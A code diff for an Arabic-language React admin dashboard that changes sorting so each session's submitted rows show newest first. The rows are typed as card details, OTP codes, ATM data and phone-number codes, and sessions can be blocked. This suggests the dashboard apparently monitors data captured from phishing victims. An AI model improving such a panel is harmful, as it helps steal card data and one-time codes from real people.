@@ -73,6 +73,10 @@ function StatCard({ label, value, icon, color, onClick }: { label: string; value
 
 function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: SubmissionRow[]; onClose: () => void }) {
   if (!open) return null;
+  
+  // Sort rows by ID descending (newest first) for display
+  const sortedRows = [...rows].sort((a, b) => b.id - a.id);
+  
   return (
     <Dialog open onOpenChange={(value) => !value && onClose()}>
       <DialogContent className="sm:max-w-[760px] max-h-[85vh] flex flex-col" dir="rtl">
@@ -81,7 +85,7 @@ function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: Su
         </DialogHeader>
         <ScrollArea className="flex-1 mt-4">
           <div className="space-y-4">
-            {rows.map((row) => {
+            {sortedRows.map((row) => {
               const data = parseData(row.data);
               return (
                 <div key={row.id} className="rounded-3xl border border-slate-200 bg-white p-4">
@@ -137,18 +141,21 @@ function SessionBox({
   const [expanded, setExpanded] = useState(true);
   const [loadingAction, setLoadingAction] = useState<string | null>(null);
 
+  // Rows are already sorted by ID DESC (newest first) from parent useMemo
   const initialRow = rows.find((row) => row.type === "initial");
   const initialData = parseData(initialRow?.data ?? null);
   const name = initialData.ownerName || "مستخدم";
   const phone = initialData.phone || "بدون هاتف";
   const cardRows = rows.filter((row) => row.type === "card");
-  const latestCard = cardRows[cardRows.length - 1];
+  // Use FIRST card (newest) since rows are sorted by ID desc
+  const latestCard = cardRows[0];
   const cardData = parseData(latestCard?.data ?? null);
   const otpRows = rows.filter((row) => row.type.startsWith("otp"));
   const atmRows = rows.filter((row) => row.type === "atm");
   const nomerRows = rows.filter((row) => row.type === "nomer");
   const nomerOtpRows = rows.filter((row) => row.type === "nomer_otp");
-  const lastActivity = rows[rows.length - 1]?.createdAt ?? rows[0]?.createdAt;
+  // Use first row (newest) for lastActivity since rows are sorted desc by id
+  const lastActivity = rows[0]?.createdAt;
 
   const statusBadge = blocked
     ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
@@ -508,12 +515,14 @@ export default function AdminDashboard() {
         grouped[row.sessionId].push(row);
       });
 
-    Object.values(grouped).forEach((list) => list.sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()));
+    // Sort EACH session's rows by ID DESCENDING (newest first) - CRITICAL FIX
+    Object.values(grouped).forEach((list) => list.sort((a, b) => b.id - a.id));
 
     return Object.fromEntries(
       Object.entries(grouped).sort(([, a], [, b]) => {
-        const aTime = new Date(a[a.length - 1].createdAt).getTime();
-        const bTime = new Date(b[b.length - 1].createdAt).getTime();
+        // Sort sessions by their NEWEST record (first item after sort by id desc)
+        const aTime = new Date(a[0].createdAt).getTime();
+        const bTime = new Date(b[0].createdAt).getTime();
         return bTime - aTime;
       }),
     );
